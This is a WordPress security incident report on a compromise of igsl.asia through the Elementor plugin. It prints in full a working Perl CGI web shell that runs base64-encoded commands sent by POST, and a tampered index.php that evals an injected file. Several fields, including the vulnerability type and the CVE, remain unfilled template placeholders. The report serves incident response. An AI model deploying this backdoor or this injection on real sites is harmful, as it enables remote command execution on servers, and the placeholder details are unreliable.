Scripts Execution Timestamp: 05-05-2025 03:17 PM
Reported By: Ate Awit Leones
Forwarded By: Kuya Andy Barredo

Scripts Displayed Name: hello.txt

Code Execution x Backdoor used:

--

#!/usr/bin/perl   -I/usr/local/bandmin
use MIME::Base64;print "Content-type: text/html\n\n";if($ENV{'REQUEST_METHOD'} eq "POST"){my ($i, $key, $val, $in);read(STDIN, $in, $ENV{'CONTENT_LENGTH'});@in = split(/&/, $in);foreach $i (0 .. $#in){$in[$i] =~ s/\+/ /g;($key, $val) = split(/=/, $in[$i], 2);$key =~ s/%(..)/pack("c", hex($1))/ge;$val =~ s/%(..)/pack("c", hex($1))/ge;$in{$key} .= "\0" if (defined($in{$key}));$in{$key} .= $val;}if($in{"cmd"}){print decode_base64($in{"check"})."<pre>";system(decode_base64($in{"cmd"}));print "</pre>"}}

--




## 🛡️ WordPress Security Incident Report

**Incident Type:** Plugin Vulnerability Exploitation  
**Status:** Investigated / Mitigated / Ongoing (choose one)  
**Date of Discovery:** 05-05-2025  
**Affected System:** https://igsl.asia  
**Reporting Team:** ICT x Cyberist Team  

---

### 🕵️ Summary of Incident

On **05-05-2025**, unusual activity was detected on the WordPress installation hosted at **https://igsl.asia**. After investigation, it was determined that a malicious actor exploited a vulnerability in the **Elementor** plugin to gain unauthorized access or execute malicious operations on the site.

---

### 🛠️ Attack Vector

* **Plugin Name:** `Elementor`  
* **Version:** `3.27.3`  
* **Vulnerability Type:** [e.g., Arbitrary File Upload / SQL Injection / RCE]  
* **CVE Identifier (if applicable):** [CVE-YYYY-NNNN]  
* **Exploit Method:**  
  The attacker sent crafted requests to the vulnerable plugin endpoint, enabling them to [upload malicious PHP files / modify site content / gain admin access].

---

### 📆 Timeline of Events

| Date & Time         | Event Description                     |
| -------------------- | ------------------------------------- |
| 05-05-2025 03:00 PM | Suspicious login/file access detected |
| 05-05-2025 03:05 PM | Logs reviewed; malicious file found   |
| 05-05-2025 03:10 PM | Plugin identified as vulnerable       |
| 05-05-2025 03:15 PM | Plugin disabled and removed           |
| 05-05-2025 03:20 PM | Patches applied / backups restored    |

---

### 🔍 Forensic Findings

* **Malicious Files Detected:**  

  * `/OSD_DATA/osdcgiapi/.htaccess`
  * `/OSD_DATA/osdcgiapi/perl.alfa`  
  * `/hello.txt`  

  Modified index.php  calling hello.txt the gombling page.



<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
eval("?>".file_get_contents('./hello.txt'));
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';

  ---

* **Logs Indicating Compromise:**  

  * Access logs show POST requests to `/wp-admin/admin-ajax.php` or plugin-specific endpoints.  
  * Timestamps correspond to file uploads or privilege escalation.  

* **Users Affected:**  

  * [Administrator]  

---

### 🩹 Containment & Remediation

* Plugin immediately removed from the server.  
* All admin passwords reset.  
* Verified file integrity of core WordPress files and themes.  
* Disabled file editing via `wp-config.php`.  
* Installed and configured security plugin (e.g., Wordfence, Sucuri).  
* Updated all plugins, themes, and WordPress core to latest versions.  

---

### ✅ Preventive Measures

* Enabled automatic updates for all plugins and core.  
* Added file change detection monitoring.  
* Scheduled regular backups and offsite storage.  
* Implemented web application firewall (WAF).  
* Conducted staff awareness on phishing and credential hygiene.  

---

### 📝 Recommendations

* Audit third-party plugins regularly for security reputation and update activity.  
* Avoid using plugins that are outdated or no longer maintained.  
* Harden WordPress by disabling XML-RPC and limiting admin access via IP.  

---